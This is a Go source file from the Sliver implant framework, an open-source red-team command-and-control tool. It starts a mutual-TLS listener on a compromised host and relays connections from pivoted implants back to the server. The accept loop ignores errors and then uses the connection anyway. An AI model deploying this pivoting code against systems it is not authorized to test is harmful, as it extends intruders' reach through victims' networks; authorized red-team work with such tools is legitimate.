package pivots

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}
	"crypto/tls"
	"fmt"
	"net"
	"net/url"

	"github.com/bishopfox/sliver/sliver/transports"
)

// StartMutualTLSListener - Start a mutual TLS listener on the implant's host. The tls.Config has been
// built by the RPC handler function when the implant received that listener request.
func StartMutualTLSListener(tlsConfig *tls.Config, bindIface string, port uint16, routeID uint32) (err error) {

	// {{if .Config.Debug}}
	log.Printf("Starting raw TCP/mTLS listener on %s:%d", bindIface, port)
	// {{end}}

	ln, err := tls.Listen("tcp", fmt.Sprintf("%s:%d", bindIface, port), tlsConfig)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Error starting mTLS listener: %s", err.Error())
		// {{end}}
		return
	}

	go acceptSliverConnections(ln, routeID)
	return
}

func acceptSliverConnections(ln net.Listener, routeID uint32) {

	for {
		// Accept connection
		conn, err := ln.Accept()
		if err != nil {

		}

		proto := conn.RemoteAddr().Network()
		host := conn.RemoteAddr().String()
		pivotURL, _ := url.Parse(fmt.Sprintf("%s://%s", proto, host))

		// Instantiate new transport, and handle multiplexing, and route back
		// the first muxed stream (used by pivoted implant to speak RPC with server)
		transport, _ := transports.NewTransport(pivotURL)
		transport.StartMuxPivot(conn, routeID)
	}
}
